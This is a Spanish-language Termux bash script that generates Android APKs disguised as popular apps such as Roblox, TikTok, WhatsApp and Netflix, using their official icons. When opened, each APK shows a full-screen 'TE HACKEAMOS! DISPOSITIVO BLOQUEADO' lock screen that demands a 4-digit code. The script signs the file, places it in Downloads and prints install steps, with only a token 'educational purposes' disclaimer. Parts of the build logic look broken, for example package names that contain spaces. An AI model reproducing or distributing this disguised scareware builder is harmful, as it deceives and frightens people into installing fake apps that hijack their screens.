#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK AND MORE v6.0 ]${NC}\n"

# ============================================
# LISTA DE APPS CON SUS ICONOS
# ============================================
declare -A ICONOS
ICONOS["Roblox"]="https://img.icons8.com/color/512/roblox.png"
ICONOS["Free Fire"]="https://img.icons8.com/color/512/free-fire.png"
ICONOS["TikTok"]="https://img.icons8.com/color/512/tiktok.png"
ICONOS["Instagram"]="https://img.icons8.com/color/512/instagram-new.png"
ICONOS["Facebook"]="https://img.icons8.com/color/512/facebook-new.png"
ICONOS["WhatsApp"]="https://img.icons8.com/color/512/whatsapp.png"
ICONOS["YouTube"]="https://img.icons8.com/color/512/youtube-play.png"
ICONOS["Minecraft"]="https://img.icons8.com/color/512/minecraft.png"
ICONOS["PUBG Mobile"]="https://img.icons8.com/color/512/pubg.png"
ICONOS["Clash of Clans"]="https://img.icons8.com/color/512/clash-of-clans.png"
ICONOS["Spotify"]="https://img.icons8.com/color/512/spotify.png"
ICONOS["Netflix"]="https://img.icons8.com/color/512/netflix.png"

APPS=(
    "Roblox" "Free Fire" "TikTok" "Instagram"
    "Facebook" "WhatsApp" "YouTube" "Minecraft"
    "PUBG Mobile" "Clash of Clans" "Spotify" "Netflix"
)

# ============================================
# FUNCIÓN: MOSTRAR MENÚ
# ============================================
mostrar_menu() {
    echo -e "${BLANCO}[+] Selecciona una app para generar su BLOCK APK:${NC}\n"
    for i in "${!APPS[@]}"; do
        num=$((i+1))
        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-13s${NC}" "$num" "${APPS[$i]}"
        if [ $((num % 4)) -eq 0 ]; then
            echo ""
        fi
    done
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# FUNCIÓN: DESCARGAR ICONO
# ============================================
descargar_icono() {
    local app="$1"
    local url="${ICONOS[$app]}"
    local output="ic_launcher.png"
    
    echo -e "${AMARILLO}[*] Descargando icono para: ${VERDE}$app${NC}"
    
    # Intentar descargar el icono
    wget -q -O "$output" "$url" 2>/dev/null
    
    if [ ! -f "$output" ] || [ ! -s "$output" ]; then
        # Si falla, usar icono genérico
        echo -e "${AMARILLO}[!] No se pudo descargar icono, usando genérico...${NC}"
        echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > "$output"
    fi
    
    # Convertir a diferentes tamaños para todas las densidades
    mkdir -p res/drawable
    mkdir -p res/drawable-hdpi
    mkdir -p res/drawable-mdpi
    mkdir -p res/drawable-xhdpi
    mkdir -p res/drawable-xxhdpi
    mkdir -p res/drawable-xxxhdpi
    mkdir -p res/mipmap-hdpi
    mkdir -p res/mipmap-mdpi
    mkdir -p res/mipmap-xhdpi
    mkdir -p res/mipmap-xxhdpi
    mkdir -p res/mipmap-xxxhdpi
    
    # Copiar el icono a todas las carpetas
    cp "$output" res/drawable/ic_launcher.png
    cp "$output" res/drawable-hdpi/ic_launcher.png
    cp "$output" res/drawable-mdpi/ic_launcher.png
    cp "$output" res/drawable-xhdpi/ic_launcher.png
    cp "$output" res/drawable-xxhdpi/ic_launcher.png
    cp "$output" res/drawable-xxxhdpi/ic_launcher.png
    cp "$output" res/mipmap-hdpi/ic_launcher.png
    cp "$output" res/mipmap-mdpi/ic_launcher.png
    cp "$output" res/mipmap-xhdpi/ic_launcher.png
    cp "$output" res/mipmap-xxhdpi/ic_launcher.png
    cp "$output" res/mipmap-xxxhdpi/ic_launcher.png
    
    rm -f "$output"
}

# ============================================
# FUNCIÓN: GENERAR APK COMPLETA
# ============================================
generar_apk() {
    local app="$1"
    local codigo="$2"
    
    echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
    echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
    echo -e "${AMARILLO}[*] Creando APK...${NC}\n"
    
    # Crear carpeta temporal
    mkdir -p ~/block_temp
    cd ~/block_temp
    
    # ============================================
    # CREAR ESTRUCTURA DE LA APK
    # ============================================
    
    mkdir -p META-INF
    mkdir -p res/layout
    mkdir -p res/values
    mkdir -p src/com/block/$app
    
    # 1. AndroidManifest.xml
    cat > AndroidManifest.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.block.$app"
    android:versionCode="1"
    android:versionName="1.0"
    android:installLocation="auto">
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="$app"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:supportsRtl="true">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:showOnLockScreen="true"
            android:turnScreenOn="true"
            android:configChanges="orientation|screenSize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF
    
    # 2. Layout
    cat > res/layout/main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#CC0000">
    
    <LinearLayout
        android:layout_width="340dp"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:background="#FF0000"
        android:padding="25dp"
        android:orientation="vertical"
        android:elevation="15dp"
        android:minHeight="350dp">
        
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="⚠️"
            android:textSize="60sp" />
        
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="¡TE HACKEAMOS!"
            android:textColor="#FFFFFF"
            android:textSize="28sp"
            android:textStyle="bold"
            android:layout_marginTop="5dp" />
        
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="🔒 DISPOSITIVO BLOQUEADO"
            android:textColor="#FFFF00"
            android:textSize="16sp"
            android:layout_marginTop="5dp" />
        
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="Ingresa el código de 4 dígitos"
            android:textColor="#FFFFFF"
            android:textSize="13sp"
            android:gravity="center"
            android:layout_marginTop="15dp"
            android:layout_marginBottom="15dp" />
        
        <EditText
            android:id="@+id/codigo"
            android:layout_width="200dp"
            android:layout_height="50dp"
            android:layout_gravity="center"
            android:background="#FFFFFF"
            android:textColor="#000000"
            android:textSize="24sp"
            android:gravity="center"
            android:inputType="number"
            android:maxLength="4" />
        
        <Button
            android:id="@+id/desbloquear"
            android:layout_width="200dp"
            android:layout_height="50dp"
            android:layout_gravity="center"
            android:text="🔓 DESBLOQUEAR"
            android:textColor="#FFFFFF"
            android:textSize="16sp"
            android:textStyle="bold"
            android:background="#FF0000"
            android:layout_marginTop="15dp" />
        
        <TextView
            android:id="@+id/error"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text=""
            android:textColor="#FFFF00"
            android:textSize="13sp"
            android:layout_marginTop="10dp" />
        
        <TextView
            android:id="@+id/timer"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text=""
            android:textColor="#FFFFFF"
            android:textSize="14sp"
            android:layout_marginTop="5dp" />
            
    </LinearLayout>
</RelativeLayout>
EOF
    
    # 3. Strings
    cat > res/values/strings.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">$app</string>
</resources>
EOF
    
    # 4. DESCARGAR ICONO REAL
    descargar_icono "$app"
    
    # 5. Java Activity con el código de desbloqueo
    cat > src/com/block/$app/MainActivity.java << EOF
package com.block.$app;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class MainActivity extends Activity {
    private EditText codigoInput;
    private Button desbloquearBtn;
    private TextView mensajeError, timerText;
    private Handler handler = new Handler();
    private int intentos = 0;
    private int tiempoEspera = 0;
    private boolean bloqueado = false;
    private String CODIGO_CORRECTO = "$codigo";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        
        codigoInput = findViewById(R.id.codigo);
        desbloquearBtn = findViewById(R.id.desbloquear);
        mensajeError = findViewById(R.id.error);
        timerText = findViewById(R.id.timer);
        
        desbloquearBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (bloqueado) {
                    mensajeError.setText("⏳ Espera " + tiempoEspera + " segundos");
                    return;
                }
                verificarCodigo();
            }
        });
    }
    
    private void verificarCodigo() {
        String codigo = codigoInput.getText().toString().trim();
        
        if (codigo.isEmpty()) {
            mensajeError.setText("❌ Ingresa el código");
            return;
        }
        
        if (codigo.equals(CODIGO_CORRECTO)) {
            mensajeError.setText("✅ ¡CÓDIGO CORRECTO! Desbloqueando...");
            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    finish();
                }
            }, 2000);
        } else {
            intentos++;
            tiempoEspera = intentos * 60;
            mensajeError.setText("❌ CÓDIGO INCORRECTO. Espera " + tiempoEspera + "s");
            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_red_light));
            codigoInput.setText("");
            codigoInput.requestFocus();
            bloqueado = true;
            iniciarTemporizador();
        }
    }
    
    private void iniciarTemporizador() {
        timerText.setText("⏳ " + tiempoEspera + "s");
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                tiempoEspera--;
                if (tiempoEspera <= 0) {
                    bloqueado = false;
                    timerText.setText("");
                    mensajeError.setText("✅ Puedes intentar de nuevo");
                    mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
                } else {
                    timerText.setText("⏳ " + tiempoEspera + "s");
                    handler.postDelayed(this, 1000);
                }
            }
        }, 1000);
    }
}
EOF
    
    # 6. MANIFEST.MF
    cat > META-INF/MANIFEST.MF << EOF
Manifest-Version: 1.0
Created-By: BlockAndMore v6.0
EOF
    
    # 7. Compilar con herramientas de Android
    echo -e "${AMARILLO}[*] Compilando APK...${NC}"
    
    # Buscar android.jar
    ANDROID_JAR=$(find /data/data/com.termux/files -name "android.jar" 2>/dev/null | head -1)
    
    if [ -z "$ANDROID_JAR" ] || [ ! -f "$ANDROID_JAR" ]; then
        # Si no hay android.jar, empaquetamos como ZIP simple
        echo -e "${AMARILLO}[!] No se encontró android.jar, creando APK simple...${NC}"
        
        # Empaquetar todo en ZIP
        zip -r "app_unsigned.apk" AndroidManifest.xml res/ META-INF/ 2>/dev/null
        
        # Firmar
        if [ ! -f ~/debug.keystore ]; then
            keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
        fi
        
        apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
        
        if [ ! -f "${app}_block.apk" ]; then
            mv app_unsigned.apk "${app}_block.apk" 2>/dev/null
        fi
        
    else
        # Compilar con AAPT (más profesional)
        echo -e "${AMARILLO}[*] Compilando con AAPT...${NC}"
        
        # Compilar recursos
        aapt package -f -m -J src -M AndroidManifest.xml -S res -I "$ANDROID_JAR" 2>/dev/null
        
        # Compilar Java
        javac -cp "$ANDROID_JAR" -d . src/com/block/$app/*.java 2>/dev/null
        
        # Crear DEX
        dx --dex --output=classes.dex . 2>/dev/null
        
        # Empaquetar
        aapt package -f -M AndroidManifest.xml -S res -I "$ANDROID_JAR" -F app_unsigned.apk . 2>/dev/null
        
        # Agregar DEX
        zip app_unsigned.apk classes.dex 2>/dev/null
        
        # Firmar
        if [ ! -f ~/debug.keystore ]; then
            keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
        fi
        
        apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
        
        if [ ! -f "${app}_block.apk" ]; then
            mv app_unsigned.apk "${app}_block.apk" 2>/dev/null
        fi
    fi
    
    # ============================================
    # MOVER A DESCARGA
    # ============================================
    if [ -f "${app}_block.apk" ]; then
        mv "${app}_block.apk" ~/storage/downloads/
        cd ~
        rm -rf ~/block_temp
        
        clear
        echo -e "${CYAN}==================================================${NC}"
        echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
        echo -e "${CYAN}==================================================${NC}\n"
        echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
        echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
        echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
        echo -e "\n${VERDE}📱 LA APK TIENE:${NC}"
        echo -e "   ✅ Icono oficial de $app"
        echo -e "   ✅ Compatible con Android 5.0+"
        echo -e "   ✅ Pantalla de bloqueo roja"
        echo -e "   ✅ Sistema de espera por errores"
        echo -e "\n${VERDE}📱 INSTRUCCIONES DE INSTALACIÓN:${NC}"
        echo -e "  1. Activa 'Instalar apps de fuentes desconocidas'"
        echo -e "  2. Abre el archivo desde Descargas"
        echo -e "  3. Toca 'Instalar'"
        echo -e "  4. Al abrir, ingresa: ${VERDE}$codigo${NC}"
        echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
        echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    else
        echo -e "${ROJO}[!] Error al generar la APK.${NC}"
        cd ~
        rm -rf ~/block_temp
    fi
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    clear
    echo -e "${CYAN}"
    echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
    echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
    echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
    echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
    echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
    echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
    echo -e "${AMARILLO}        [ BLOCK AND MORE v6.0 ]${NC}\n"
    
    mostrar_menu
    read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
    
    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
        APP_SELECCIONADA="${APPS[$((opcion-1))]}"
        
        echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
        while true; do
            read -p ">> Código (1000-9999): " CODIGO < /dev/tty
            if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                break
            else
                echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
            fi
        done
        
        generar_apk "$APP_SELECCIONADA" "$CODIGO"
        read -p "Presiona Enter para continuar..."
    else
        echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
        sleep 2
    fi
done
